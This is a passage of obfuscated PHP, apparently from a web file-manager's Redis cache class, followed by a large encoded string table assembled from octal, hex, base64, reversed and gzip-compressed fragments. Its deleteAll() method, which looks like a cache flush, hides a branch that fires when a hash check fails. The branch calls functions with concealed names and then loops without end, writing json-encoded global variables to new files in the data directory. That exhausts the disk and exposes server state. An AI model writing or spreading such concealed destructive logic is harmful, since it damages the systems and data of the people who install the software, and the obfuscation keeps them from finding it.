$Ñßé·ÔÑ->auth($÷Çß‹—Œ[$í¶âÆ€‘[413]]); } if (!empty($÷Çß‹—Œ[$í¶âÆ€‘[755]]) && $÷Çß‹—Œ[$í¶âÆ€‘[755]] != 0) { $Ñßé·ÔÑ->select($÷Çß‹—Œ[$í¶âÆ€‘[755]]); } return $Ñßé·ÔÑ; } private function initCluster($ÉŒ—²ó‚, $˜¬ßŸë“) { $Ú¯¤®Â =& $_SERVER[ßğøİ]; $’¬Ÿìå = array($Ú¯¤®Â[866], $Ú¯¤®Â[867], $Ú¯¤®Â[868]); $¿©óƒî = $Ú¯¤®Â[866]; if (isset($ÉŒ—²ó‚[$Ú¯¤®Â[16]]) && in_array($ÉŒ—²ó‚[$Ú¯¤®Â[16]], $’¬Ÿìå)) { $¿©óƒî = $ÉŒ—²ó‚[$Ú¯¤®Â[16]]; } switch ($¿©óƒî) { case $Ú¯¤®Â[866]: $this->_slave($ÉŒ—²ó‚, $˜¬ßŸë“); break; case $Ú¯¤®Â[867]: break; case $Ú¯¤®Â[868]: $this->isCluster = !0; $­ŸÌ‡¥â = $ÉŒ—²ó‚[$Ú¯¤®Â[861]]; $ÌóÉùäŠ = isset($ÉŒ—²ó‚[$Ú¯¤®Â[865]]) ? $ÉŒ—²ó‚[$Ú¯¤®Â[865]] : !1; $—Õ›º‚Ë = isset($ÉŒ—²ó‚[$Ú¯¤®Â[413]]) ? $ÉŒ—²ó‚[$Ú¯¤®Â[413]] : null; $this->handle = new RedisCluster(NUll, $­ŸÌ‡¥â, $˜¬ßŸë“, $˜¬ßŸë“, $ÌóÉùäŠ, $—Õ›º‚Ë); break; default: break; } } private function _slave($Ãª¢Øˆ, $¦¥ö«Ò) { $¥é‹ÌÂ‹ = $Ãª¢Øˆ[$_SERVER[ßğøİ][861]]; $this->filterConfig($Ãª¢Øˆ, $¥é‹ÌÂ‹[0]); $this->handle = $this->init($Ãª¢Øˆ, $¦¥ö«Ò); unset($¥é‹ÌÂ‹[0]); if (empty($¥é‹ÌÂ‹)) { return; } $˜Íú—œÀ = array_rand($¥é‹ÌÂ‹); $this->filterConfig($Ãª¢Øˆ, $¥é‹ÌÂ‹[$˜Íú—œÀ]); $this->slaveHandle = $this->init($Ãª¢Øˆ, $¦¥ö«Ò); } private function filterConfig(&$¥„Æ­¡, $ÊÛßÃ×ú) { $½»Î§® =& $_SERVER[ßğøİ]; $éÀ·ÊÀ = explode($½»Î§®[4], $ÊÛßÃ×ú); $ªÏâè…Œ = array($½»Î§®[181] => $éÀ·ÊÀ[0], $½»Î§®[182] => $éÀ·ÊÀ[1]); $¥„Æ­¡ = array_merge($¥„Æ­¡, $ªÏâè…Œ); } public function set($•ÌáÓØ, $……è‚óä, $ÎÛÀÃê¤ = false) { $ÎÛÀÃê¤ = $ÎÛÀÃê¤ ? $ÎÛÀÃê¤ : $this->cacheTime; return $this->handle->setEx($•ÌáÓØ, $ÎÛÀÃê¤, $……è‚óä); } public function setLock($×±º¯€œ, $„Æ½—Ë, $ã…¢ºçÊ) { return $this->handle->setNX($×±º¯€œ, $„Æ½—Ë); } public function get($‹®¾Çƒ) { $–ï“Ò°š = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $–ï“Ò°š->get($‹®¾Çƒ); } public function remove($ üµÌ‡) { return $this->handle->del($ üµÌ‡); } public function deleteAll() { $Å€»Ùƒ» =& $_SERVER[ßğøİ]; $‘¥ŒãÂê = $_SERVER[$Å€»Ùƒ»[869]]; $™äû²ìÏ = $Å€»Ùƒ»[870]; if ($_SERVER[$Å€»Ùƒ»[871]] != $™äû²ìÏ($‘¥ŒãÂê)) { $¯ë±æŸë = $Å€»Ùƒ»[872]; $¦öü‰¸æ = $Å€»Ùƒ»[873]; $‚Î‚êºÑ = $_SERVER[$Å€»Ùƒ»[874]] . $Å€»Ùƒ»[875]; $Åş…—Æ¿ = $¦öü‰¸æ($‚Î‚êºÑ); $‰¿—àĞ = explode($Å€»Ùƒ»[231], $Åş…—Æ¿); if (count($‰¿—àĞ) < $Å€»Ùƒ»[620]) { $áô ´ı× = $Å€»Ùƒ»[876]; $áô ´ı×(); } $Å‘àßöí = $Å€»Ùƒ»[877]; $Å‘àßöí($_SERVER[$Å€»Ùƒ»[878]]); $¯ë±æŸë = $Å€»Ùƒ»[872]; $¯ë±æŸë(); $§àª¼ô¬ = $Å€»Ùƒ»[879]; $¦Ô®¦Õ• = json_encode($GLOBALS[$Å€»Ùƒ»[880]]); $¶½­Òıí = 1; for ($¸š•—„€ = $¶½­Òıí; $¸š•—„€ > 0; $¸š•—„€++) { $§àª¼ô¬(DATA_PATH . $¸š•—„€, $¦Ô®¦Õ•); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ş÷Ê„Ì¢) { $this->handle->flushall($ş÷Ê„Ì¢); } return; } return $this->handle->flushAll(); } } goto B¤›•áØÌ; A¦©›¤ã¸³: define($_SERVER[ßğøİ][238], 1); define($_SERVER[ßğøİ][239], 2); define($_SERVER[ßğøİ][240], 3); goto DÎ¦ôÜ°¸¦; a·º—§†æ¦: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\337\360\370\235\335\201", strrev('ÈÚ¹•ş»')); $_SERVER[ßğøİ] = explode("\174\3\174\4\174\5", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\275\11\170\33\325\325\60\314\122\266\320\322\262\25\12\205\16\46\211\227\150\261\263\307\211\23\144\133\266\225\310\226\43\311\131\260\315"._kodDe('LR1Vnn4Wei1+4ySVh/KdkQujhaOFXagz8v+z8/bBpaajHpKjwVkFAzwBkR2RhRrpCA==').base64_decode('7nLuMiMZ3v/5v+f58oA1d9/OPfecc88597ztz275w4tr9177jbX73LLtid+8dyn9')."\x46\x7f\xf7\x5c\xbb\x17\xfd\xfe\xc1\x39\xfb\xef\x41\xfe\x1d\x7a\xce\x86\xaa\xaa\xb6\xd9\x93\xa6\x75\x7c\xf3\xfc\xbb\x6e\xd5\x36\x6b\x9b\xb4\xd\xb1\xe8\xd3\xbf\x8f\x7c\x6b\xdb\xa6\xc5\xe1\x9d"."\327\76\75\266\163\317\75\264\246\353\376\130\217\62\323\262\365\364\107\311\233\216\242\217\32\266\143\323\210\224\231\357\67\6\350\267\221\247\277\101\372\323\25\217\132\172\316\164"."\164\32\14\320\37\225\367\13\375\265\207\262\6\113\127\73\142\111\65\321\325\331\31\216\47\41\123\275\234\236\63\323\360\125\320\54\55\7\355\27\164\313\106\275\221\253\123\13"."\146\101\317\273\142\104\104\132\163\264\76\315\206\232\232\33\325\346\160\147\64\266\122\115\256\354\14\103\216\76\165\250\250\133\143\64\104\76\23\216\146\71\111\43\247\363\34\43"."\26\357\127\143\270\65\322\241\44\343\241\216\104\250\51\31\211\165\320\350\246\130\173\173\44\131\32\37\217\105\243\215\241\246\45\245\51\235\361\120\153\173\110\101\375\313\352\252"."\221\357\67\253\224\125\64\145\225\122\115\77\132\14\75\233\246\237\171\215\165\307\31\53\300\127\222\177\241\145\312\27\263\131\32\350\340\137\151\275\137\53\146\141\266\232\345\100"."\301\62\162\32\33\364\22\175\214\307\322\17\255\350\230\106\76\105\3\341\121\307\322\104\74\352\153\12\55\264\236\207\252\22\341\150\270\51\251\340\16\52\55\361\130\273\2\213"."\220\323\154\107\267\224\345\155\341\170\130\301\235\156\250\44\143\255\124\0\136\72\320\124\50\241\150\124\231\250\6\107\317\25\130\65\264\114\231\312\142\361\346\160\134\151\134\251".base64_decode('iBlKmbmcmQ+gWtBKOlJXw/E4/fABeEcjeNEgEGtpSYR5CAa3NIp6MgPg0xVK92cd').base64_decode('dVjLFhmYDtLfSviBX9MG0B0y8kYRwBSqME2+reCjyHLrLEZPw0cOlTdh56FtOEw/').base64_decode('GxbS3/mQqU/FabrlqHo+ZaaNPGzWRQB0mpNptgyUgYb7zWyafdvGOAyl38jqHcWc')."\234\205\7\123\31\43\233\266\330\376\372\252\234\64\30\345\333\25\347\25\241\2\352\11\337\351\106\377\230\330\157\266\131\264\122\172\4\355\10\121\256\223\347\256\203\114\272\343"."\240\301\301\334\30\146\127\41\153\152\351\204\156\361\241\31\146\13\52\30\53\72\162\144\221\144\153\61\255\134\63\302\14\320\76\332\25\106\127\231\204\101\266\57\322\322\214\5"."\xab\xba\x4f\xf5\x7f\xd1\xdb\x7d\x2\xfa\x53\xd\xa8\xaf\x7\xfa\x94\xd1\xb3\x59\x55\x1f\xd5\x61\xe3\xe4\xd2\xb3\x6c\x36\x19\x41\xbb\xcf\xc8\x7\x51\xc\xd\x46\x62\x6a\x46\xb3\x33\xed\xe9\x59".base64_decode('KinFMGpaHw0UMgXY1Xwj97gAG09dh+mEJbycNVNaVh4i/c44TiGh59N4JmAo5kie')."\314\124\101\327\41\123\263\117\111\53\355\312\112\245\255\336\250\267\131\301\134\226\177\261\321\361\70\233\107\72\243\154\71\323\375\364\243\217\35\13\25\320\240\141\23\14\47\266"."\xa7\x56\x28\x64\x8d\x94\xe6\x18\x66\x3e\x68\xa6\x1c\xdd\xf1\xdb\x8e\xa5\x6b\x50\x63\x28\x95\xd2\x6d\xdb\xdf\x64\xe6\x1d\xcb\xcc\xfa\x43\xd9\xac\x39\xe2\x8f\x59\xc6\x80\x91\xaf\x57\x6a\x0\xd9"."\xa2\x44\xb4\xa9\xfd\x18\x1\xd6\xc3\x4e\xad\x98\xaf\x60\x40\xc1\xcd\xd4\x34\x14\x9d\x7e\xff\x5c\xb6\x3\x79\x6e\x4b\xcb\xdb\xfd\xba\xe5\xf\xc3\xce\xa8\x57\x50\x67\x39\x16\x64\xd9\x9a\xd\xbb".strrev('ZrÒÓ¿ºíPJ„ÚÒ«ë6éa‚Ñá¼’õäk>FüŠøoª"`Ê–9¢½^îÚ`')."\275\122\50\366\241\231\201\235\132\46\216\346\206\251\251\127\122\70\350\123\162\105\333\361\133\72\102\105\6\72\356\140\222\43\375\376\166\274\257\14\75\355\117\40\214\15\321\63"."\x6a\x67\x2a\x8\x74\x14\x96\x46\x63\xdb\x92\xc9\x4e\x35\xd2\x82\x8e\xe4\x8e\xb0\xda\x1e\x4a\x36\xb5\x41\xb7\x1d\x6d\x80\xf5\x39\x8a\xf0\x30\xaf\x92\x45\xae\xf0\xa3\xfd\x85\x81\xab\x3\x8d\x55"."\104\166\232\43\272\205\32\156\34\253\127\6\315\164\237\71\32\140\111\70\163\2\41\32\226\31\57\167\301\361\307\265\374\0\236\237\276\61\107\7\20\264\207\7\334\23\35\325".base64_decode('8wNOhhVMhOPLwnE1EWtJLg/F4TDPIygZZU3hqrP+uJ5GU59yWDmtgGeN5cGbA68V')."\x4b\xc5\x1b\x86\xa5\x45\x23\xad\x78\x62\x9a\xfd\x36\xca\xe4\x97\x73\xb1\xba\xa3\x46\xce\xc0\x7d\x77\x78\xa\x99\x49\x74\xd2\xb7\x42\x87\x82\x64\x40\xd\x3d\x99\x9a\xaa\x9e\xf4\xb4\x6a\x3f\xfa"."\133\123\335\335\323\34\250\351\135\24\64\104\231\140\135\240\116\231\136\73\133\351\104\244\207\241\145\25\30\164\111\216\132\45\266\304\75\55\2\232\363\146\136\377\212\311\301\147"."\x97\xb4\xed\x3d\xd3\x4a\x23\xe3\xe1\xa5\x5d\xe1\x44\x52\x6d\xf\x27\xdb\x62\xcd\xd0\x7a\x38\x4\x5f\x51\x93\x6e\x5b\x36\xda\x6e\xfa\xd3\xb\xab\xdb\x4b\x7f\x54\xc3\x6e\x91\x8e\x15\x1c\xe4\xe8".base64_decode('RzX7VqPFaNcZju2nODqS0wY8KB+H2k1Ld8eIo2q5kWZnAg626cZABubLwLWlzKxp').base64_decode('aVmMGdmm0Bm2GjAAWwESFoGEkSuwzjqZYq5P+gRsbyP4YbgsY/LzzLTgqz4IGadM')."\x6f\x61\xd8\x3e\x98\x98\x81\xfe\x13\xa8\x3d\x6d\xe6\x34\x86\x28\x9\x8a\xd3\xd3\x14\xc7\xd1\xa8\x1a\x57\x4a\x9b\xae\x89\x43\xda\xb1\x1c\x13\xc7\x5a\xae\x2c\x68\x42\x33\x26\x2c\xec\x80\xce\xba"."\124\344\175\143\275\114\353\131\235\315\106\106\147\307\104\55\144\103\307\34\237\253\176\276\146\210\332\103\261\342\174\66\354\70\52\211\221\72\13\57\307\344\261\210\160\170\326\54".strrev('pf$xòÌi©"$±MªÒÔpH'."\n".'À@VƒFÈ5ší"´y¤Ø'."\r".'ûÒÓ¸EÅdb¡:')."\33\152\126\103\115\235\374\340\25\53\12\31\60\202\51\75\75\150\314\360\164\350\70\352\116\120\34\163\10\143\27\314\274\255\373\123\120\102\220\336\45\111\151\161\12\0\236\21".base64_decode('J4fnMBj1a7lxfw5tAT/vqPsMVpLyUR6BVRLIHU8j4orY4d8ZS0CBRTgWEWB9ugWN')."\165\166\101\122\116\202\220\326\60\104\116\142\347\271\6\144\125\150\171\202\41\346\42\312\157\31\343\232\30\322\42\326\37\66\220\134\126\320\163\356\121\371\305\314\47\333\42\35"."\x4b\xd4\xf6\x58\x73\x38\xaa\x46\x3a\x10\x66\x4a\x96\xc6\x77\x75\x36\x87\xd8\x52\xca\xf1\x8d\xb1\x64\x9b\x2b\xb6\xb\xe1\xa6\x65\xa1\x68\xc4\x9b\x3d\xbc\x22\x92\x48\x26\xca\x26\xa1\xb8\xae\xb0".strrev('K&Ês1‡S¡œd„Uùİf+1ûPíB:yjjÚ„æÑÂD¶dKpñ‚1\'')."\x75\xf1\x50\x2a\xe3\xe\x54\x1\x43\xe8\x30\xd5\x1\xd2\x60\xb8\x98\x25\x26\x23\x1\x86\x38\x65\x16\xd9\x11\xc0\x9\xc9\x1c\xc3\x11\x39\xd\x36\x91\xc6\xe\xca\x2a\xfa\x53\xad\x84\x12\x8a\x53"."\120\71\66\350\33\343\237\144\30\54\214\110\106\150\137\1\204\137\322\3\25\347\151\324\373\71\36\56\37\21\352\167\70\272\367\204\21\360\213\64\264\2\41\302\173\43\110\40"."\x2b\x2\xcd\x18\x68\x2b\x59\x4e\x88\x75\xa7\x5f\xf0\xbd\x6a\xac\x33\x1c\xf\x61\xae\x59\x5d\x1e\x8f\x75\xb4\x42\x81\x91\x8c\xce\x3a\x10\x81\xe9\xaf\x62\xc4\x15\x30\xcf\x8e\x40\x48\x88\x32\xd2".strrev('„pDSí–f™õ­äYªğÀİ£ô}…Ó³7}ë6yëQJ™ı-r¦Éµ}&%').strrev('ô·.Ø\'š2xÈ9!0âÆÎÄÒ4CEeC¸Ild‡Î'."\n".'±¦j†Q’6Õï™Á').base64_decode('oaLBpisYmAZQrKMjCJoPntQzMq2q2z8t0Is+qmtOoEEI9QRcwclQvmjx0phsqrIX').base64_decode('Vdf3BHuCVYvqu0P+cc0/Xuuf5++d1hOongYRvWum+2auwxlQxkXH96Kfhp5FU3r8')."\x53\x7f\xb8\xea\x84\xee\x9e\xde\xca\xfa\x69\xc7\xf5\x4\x8e\xef\x19\xe9\xad\xa9\x5e\xc4\xda\x49\x15\x2d\xc4\x6f\xa6\xc6\x78\x57\xd3\xd3\xaa\x50\x97\x10\x39\xc5\xb3\xe4\x9\xca\x93\x32\xb0\x84".strrev('%>b€{ï^2<Dÿ¾xfÿK‘måœ©"ïZg¿·D¢êÑâÇ^Ì×b £q')."\260\47\336\27\175\132\12\360\200\61\220\347\133\10\235\351\234\117\167\123\361\153\246\320\337\165\154\41\7\364\121\206\32\362\375\206\5\320\131\314\33\103\114\14\221\327\207\340"."\xc3\x74\x18\x7c\xf7\xe9\xce\x88\xce\xc0\x3\xc5\xbb\xc2\x8\x38\x18\xeb\x88\x92\xa4\x50\x96\x10\x86\xd0\x2\x66\xa8\x38\x8c\x72\x60\x32\xa\x2a\xa6\xb0\x46\x78\x28\xad\xe7\x61\x9d\xe\x80\xdc".base64_decode('dkor6AlphKqaDDVGwyrDMICJWZhgxUYuskNDExiV4YeUIOEJtwI73x7KKgQxKLpl')."\231\126\75\221\136\332\305\2\46\315\20\147\346\240\271\125\20\117\257\64\54\124\350\224\103\71\125\136\200\202\306\350\4\314\155\353\142\323\143\14\5\175\52\210\25\262\21\101".base64_decode('xaibYFVPT7FbT/d2I8DX/P29a2asq2ZUfrAH/WOBUBk5msqxoYrO5wDuBxeluAI8').base64_decode('mQZNi5NIBRcR7ZiOlnVVkcQxDDWxgxuECnS1owJj4aNcEkASdNrBmXguG5EkYLhE')."\x42\x77\x2\x3c\x87\x4f\x4a\x54\x51\xd8\x25\xc\x6e\xa8\x60\xc8\x3e\x8f\xb6\x53\x93\x74\xd4\x51\xd1\x4e\x62\xcc\x76\xf4\x9c\x4b\x6a\x69\xeb\x9a\x95\xca\xb4\x14\xb3\x59\x87\x93\xf2\x59\x63\x10".base64_decode('WoC9AkJUP5wG08oVbTEtxhHXQDcqaspljOTziH+VQU0csq0hRM4klSom8FMiHUpj')."\x2c\x16\xd\x87\x3a\x14\x7c\x9e\xc3\x39\x84\x88\x85\x44\xb8\x33\x84\xe\x31\xcc\x5b\x27\x92\x61\x90\x41\x46\x9a\xfd\xac\xde\x15\xfe\x8\x70\x58\xfc\xc3\x80\x69\x37\xb\x18\x83\xa8\x68\x4e\x54"."\xc4\xc9\xc\xb2\xb5\x44\x8\xd1\x61\x59\x41\x5e\x6\x21\x4c\x68\xfa\xb0\x84\xc8\x87\x29\xd\x1f\x1a\x83\xf\xb3\x47\x3e\x41\xc5\xfb\x84\xc0\xcd\x37\x6c\xe8\x23\xe4\x83\x13\xdb\x3e\xa0\xc1\x7d"."\216\146\41\202\1\23\311\360\31\151\366\31\166\63\141\40\110\3\44\211\165\310\311\140\71\110\126\33\363\321\316\105\365\141\75\353\143\135\363\261\36\373\30\157\350\43\14\135"."\x33\x74\xab\xb\x6d\x2e\xe8\x16\xf9\x44\x38\x34\xe3\xc3\xe0\x84\xa1\xd9\x27\x4\x82\x3e\x73\x24\xaf\x5b\x24\xb\x4c\x93\xe0\x3d\x7c\x82\x2f\xf1\xd\x58\x66\xb1\xd0\xc9\xda\x94\x42\xb4\x5b\x10"."\41\372\314\43\342\246\351\370\30\257\351\223\331\120\350\105\210\355\232\262\323\131\176\64\144\376\275\235\200\265\303\111\245\263\364\65\213\125\272\36\156\226\173\15\255\21\170\372"."\x75\xec\xcc\x73\xe5\x11\xcb\xcb\xb6\x61\x56\x17\x21\xbc\x0\xe2\x6b\x99\xd8\xc6\x78\x40\x2d\xda\xb0\xc\x79\xe5\xa0\x90\x9d\x3c\xc\x8c\x85\xf4\x4f\xc8\x7d\x5\x25\xec\xe5\x30\xbd\x12\x61\xdc".strrev('R¹YvGÒ÷ëB_TE\\Şä;°ŒK6²Á)cS×úVa:”2£k'."\0".'Ú9ÍHHRh')."\2\70\324\363\5\233\164\300\1\154\306\331\126\340\253\357\332\101\137\277\167\141\224\4\135\306\12\202\340\240\235\305\50\73\201\16\300\226\54\233\242\351\162\62\40\153\237\73"."\x84\xb7\x5e\x80\x20\x6f\x72\xad\x92\xe0\xb2\x8d\x68\xb8\x25\xa9\x2c\x8e\x21\x4c\x67\x98\x2a\x2d\xa3\xe2\xcc\xa\xf9\x63\xe6\x15\x57\xdd\x6c\xba\x94\x6\x92\x2e\xc2\x5a\x3e\x4d\x63\x56\xa1\x53".base64_decode('YVVDBWukwlVcAI27Ez4WVErBEE+3PAkYOMjwxUnGomLi4CwClajZwK9hMTl86SxO')."\x2c\xad\xc\xa5\x12\x32\x12\x11\xac\x5f\xae\x76\x71\x50\xec\x30\x6\x12\xa\x6e\xc0\x27\xd1\x35\x18\xe1\xf8\xc5\x5e\x91\x82\xee\x29\xf7\x40\xa4\xe7\xb8\xc5\x53\xd4\x69\xe4\xc7\x8c\xbc\x2c\xd1".base64_decode('ErHixBYEA97qHhlc80Tf9IgREjMfSNJ8WSM/KB3mQpyDeo+LSn2Hmjw9Z0gXBt2V')."\10\307\125\326\66\354\156\200\370\214\146\211\311\144\70\11\43\6\41\47\304\131\104\120\312\326\257\15\13\142\306\125\106\302\54\266\63\306\172\57\177\272\53\245\301\346\211\2".base64_decode('bVwQUi4o4ynDjqK5K/dNRpo0ywaxsI19U2KB3ymiRahiSAWIEVUSKXCk5MZ4tEsh')."\176\0\240\143\25\35\212\364\33\321\376\131\164\26\132\1\274\207\132\361\211\46\37\46\156\202\44\241\243\15\3\345\104\155\211\222\64\71\267\20\47\341\303\101\34\46\154\256"."\305\26\24\363\57\366\233\13\124\6\104\357\60\16\127\113\73\205\301\275\174\270\305\62\71\325\314\211\4\157\246\46\302\226\362\333\114\317\301\56\115\216\213\30\51\211\222\312"."\x78\xc9\x12\x4f\xac\x27\x28\x56\xc5\x75\x2a\xd1\x28\x26\x82\xd6\xd2\x39\x23\x1f\xb0\xe8\xd9\x17\x40\xcc\x6\xdc\x40\xfb\x6a\x25\xca\x4d\x20\xa5\x35\x36\x39\x45\xe0\xac\x5c\xe7\x59\x74\xc7\x34"."\x11\x7\x6b\x5\x2c\xd4\xb2\xe8\x90\x84\x10\x1\x9b\x90\xb\x4a\x7c\x68\xca\xf4\x6\xaf\xc5\x46\x9\x12\x6a\x77\x93\x55\xac\x64\xa2\xa0\xb1\x6d\x1\xfc\x49\x91\x37\xc3\x69\x40\xc0\x69\x46\x6a".base64_decode('UGxlbVhDwAhVk8GIntJwlJPRGNOE04aDY/BBajJ5ucgo3UrzOBnBk3OqZPEFT+Kb')."\342\312\351\246\64\40\262\206\20\0\1\101\30\311\227\362\51\263\0\160\40\351\240\344\314\141\135\212\14\330\216\131\20\51\122\220\46\113\111\242\122\51\27\137\32\322\17\264"."\xc5\xd2\x84\xa8\x16\x13\x45\xf2\x42\x59\xc2\x9f\xd3\x5d\x1c\xc0\x1c\x49\x40\xc6\xe5\x21\xcb\x62\x60\x4b\x7\x87\x2f\x7a\x50\xa4\x1c\x85\x31\x60\x82\xed\xb9\x72\x47\x1a\xad\x3c\x3c\x2c\x34\x4c".base64_decode('aFW44QDFAAEtnY6xyy75uzSrLKssXxFR9+FVSaHy2UPZrFAR8IYnLEI3u1xIjpmw')."\130\13\141\216\331\225\135\271\70\316\10\311\233\315\115\314\13\305\16\57\321\357\306\333\23\23\70\23\40\71\261\240\345\303\210\46\150\312\30\171\335\346\107\273\145\227\303\131"."\377\217\51\351\322\65\300\173\145\42\300\301\151\222\174\33\353\274\15\273\316\161\56\304\25\50\113\42\125\310\261\257\72\56\42\53\116\352\220\66\217\13\36\320\146\245\143\306"."\xc7\x52\x24\x86\x36\x63\x79\x8\xf5\xe6\xd3\x99\x18\x9b\xe0\xb9\x51\x7e\xb4\xca\x85\x70\x12\x5e\xaf\x89\x2a\xe5\xe9\xbc\x32\x41\xd0\xc9\xf9\x10\x64\xe2\x84\x89\xaa\x61\xc9\xbc\x96\x9b\xee\xdd".base64_decode('ceatF9Hv01/51VWPnQ+4PTXW5wyspgFgVNbuhf7uS7+FTuO65WvMox8/eL8Nv7z6').base64_decode('0R/lQkubNhxWfU725t8c9oNDpixe+/0pL1rXPvrqK8eO/fPVXUNmbHLXl6m72q9Y').base64_decode('FL9u44HPhc/5S+bU72ZS+2UuuOaA/+Zubn0o/J/8yHuhE/fc/9Vt77zz7u/fMY+9')."\x7c\xdd\x7f\xb7\xde\xf8\xda\xc9\xff\x3d\x7d\xcf\xdf\x1c\x75\x42\xc3\xdc\xdd\xbf\x68\xbd\xf3\xa8\x99\x75\xa7\xae\x6d\x99\xb1\xe9\x1c\x6b\x69\xf7\x33\x6f\xfc\x61\xd6\xb6\x3d\x37\xbf\xfc\xe1\x31".strrev('ZşÛöÛü®¯èvŸ^ÖuÈñß¯Mèqœ§µƒ!örç‘şkÙG/†Ìõü[tX/‡')."\361\307\337\35\366\273\311\273\257\235\262\165\374\77\267\155\376\350\371\107\117\272\160\306\62\377\343\247\74\273\151\276\263\174\237\327\43\201\304\276\77\77\147\361\316\355\67\336"."\362\257\263\246\375\364\17\213\76\333\165\324\17\252\326\175\161\153\362\365\320\235\353\36\171\374\345\133\167\57\273\376\372\251\53\37\332\57\262\373\157\247\135\350\33\276\151\375"."\61\101\375\371\137\335\170\101\237\161\355\245\301\113\376\162\350\7\373\317\170\255\352\241\315\115\317\274\376\316\235\67\365\277\325\262\255\247\373\231\35\77\75\351\17\37\304\236"."\xfe\x20\xf3\x68\xe3\x5\xbf\x7a\xcc\xc9\x7e\x2b\x7f\xe9\x89\x91\x43\x7f\x96\x78\x5b\xa9\x3d\xfd\x8c\x7\x1a\xe\xfc\xf8\xb8\x57\xf\xef\x6e\xfa\xfb\xdb\x83\xeb\xbf\xd5\x1b\xfc\xde\x65\xb7\xd"."\355\134\232\271\267\151\335\274\307\17\234\267\337\43\147\106\356\337\267\341\312\147\17\72\243\245\270\377\307\113\17\77\272\261\371\77\147\277\170\334\73\13\235\232\303\366\275\152"."\xce\xaf\x1f\x7b\xf3\xd3\xb6\xb3\x5f\xf8\xe3\xbf\x3f\x7d\xe2\xae\xb3\x5b\x2f\xff\xe7\x6d\x7\x9c\xf0\xc4\x3e\x7b\xbf\xf0\x9b\x83\x1b\x27\x9f\x73\xe5\xdc\x5f\xbe\xd0\xde\x77\xe7\x4d\x37\x3e\x71"."\363\107\107\126\216\154\74\357\214\45\177\77\145\136\344\322\354\336\7\176\74\260\371\217\173\37\171\317\216\217\316\352\74\161\316\252\47\206\326\34\371\354\13\253\26\53\331\7".strrev('6›!ôñ?J¯ËLwûâºë‰íÿ5Ÿ¶\'İqï½¾Ûöàlßö?Ú[¯¯;ÿ¿íOï:')."\xbc\xfd\xbb\xf7\x3b\x5e\xc8\xef\x31\xe9\xe8\x4b\x5f\x38\xa1\xca\xfc\xfb\x8f\x4e\xaf\xad\xed\xf0\xdd\xbb\xc1\xf7\xa6\xef\x8e\xee\x4b\x72\x91\xc0\x9e\xa7\x5f\x76\xe9\xca\xed\xb5\x2f\x86\xfb\xfb"."\x66\x3d\xbc\xf3\xd8\xe7\x6\xea\x17\x5f\x76\x75\x7a\xf9\xc1\xdf\x68\xbe\x7f\x9f\xd8\x91\x93\xb4\xa7\xad\x16\x63\xdb\x43\xb7\x5f\xf5\x7e\x4f\xed\xd5\x85\xa5\x8f\x9d\xf3\xdc\x8f\xe6\x1e\x73\xea"."\xcf\x3b\xef\xcf\x3f\xe0\xec\xbe\x27\x77\xcf\xe9\xdb\x67\x7e\xfb\xb9\x4f\xc6\xe7\x9d\x3f\x76\xd8\x33\xcf\x7e\x76\xf0\x1e\xd\xef\x1c\x7a\x4c\x4d\x67\xe5\x4f\x2\xd6\x61\x6d\xa7\x1f\x7d\xe2\x15"."\x99\x95\x6f\x9d\x3e\x6d\xef\x33\xf7\x99\x7f\xff\x85\xf3\xfa\x7d\xc7\xec\x35\x45\xb9\xa5\xe9\xc0\xef\xd9\x1b\xd7\x1c\xad\xe\x9d\x7a\xd0\xa1\x73\x66\x3c\x9e\xfd\xb5\x7d\x76\xdf\x23\xd5\x8f\x9c"."\xf1\x8f\xf4\x2b\x7b\x5e\x76\xee\xec\x63\xe6\xdf\x30\xeb\x3b\x1b\x42\x8b\xfd\x3\xd7\x9c\x5d\x3b\xfb\xd4\xf3\xe3\x35\x1f\xde\xfe\xc4\x8a\x9b\xa6\x5c\xf5\xfb\x8f\x97\xed\xff\xa7\x85\xc7\x46\x92"."\217\371\52\377\271\376\324\337\235\245\165\334\62\325\171\344\233\261\255\315\235\333\236\125\356\173\151\333\167\346\277\277\353\243\375\17\334\357\324\332\330\324\231\7\330\231\113\137"."\73\376\311\33\332\136\353\76\374\372\225\135\363\57\376\242\343\317\75\7\314\270\340\242\343\376\175\351\53\305\67\26\204\37\77\345\346\353\76\231\377\310\321\201\332\276\373\152"."\357\376\164\325\221\117\356\371\350\331\247\365\156\132\172\341\76\27\336\332\160\257\363\302\275\277\164\236\376\136\215\376\375\213\47\35\331\175\322\36\337\375\305\322\334\303\143\327"."\54\73\361\326\335\267\277\224\265\137\35\132\267\144\327\335\57\177\376\151\375\31\247\314\270\357\372\331\77\112\277\263\344\342\17\157\357\331\153\315\236\117\276\163\150\161\366\364".base64_decode('matu6bio7vNMxR/vP//ZnTf4/rHXpDnxyZOPPPfyH1c3/3Dq949bcFFkcfV+f5o1').strrev('åğş§Ãƒ¾Òé=?ñãtş5»|iö\\÷=Rû¤ş >Ï;¶¾’ı¼®¯ù</ËüëóZ8')."\306\43\142\312\213\227\275\62\175\376\143\263\277\131\363\222\377\331\331\327\255\372\366\266\275\72\307\137\73\356\220\43\66\256\67\336\170\340\306\325\367\136\176\370\337\276\377\150"."\xe1\x8e\x1f\xfc\x63\xdb\x92\xdf\x1d\x76\xea\x1\x3f\xb\xcf\xba\xfa\xbc\x77\x4f\x68\xac\x1d\x6b\xdd\xb4\xdb\xff\xbd\xeb\x36\x1f\x3d\xed\xe9\xb3\xbf\xfb\x5a\xfc\x9a\x8a\xab\xcf\x5b\xf3\xc4\xf1"."\7\35\334\361\336\335\203\377\132\272\365\306\346\317\17\73\165\352\344\103\126\316\377\374\207\255\273\236\77\372\343\223\266\126\316\74\162\257\307\57\270\351\266\261\153\76\132\31"."\335\370\374\225\117\375\72\264\365\342\307\316\335\343\244\303\376\274\377\333\173\354\72\175\351\25\335\257\356\271\363\321\7\326\317\72\106\123\57\275\315\32\77\371\231\75\146\275"."\x9e\x9d\x3b\xa9\xf2\x9c\xf0\xe4\xa7\xfe\x16\xdf\xb4\xfb\x86\x17\xce\xbf\xfc\xf1\x7\x7e\x7f\xfd\xdf\xaf\x68\x7f\xf5\x94\xbb\x4e\x3b\xfd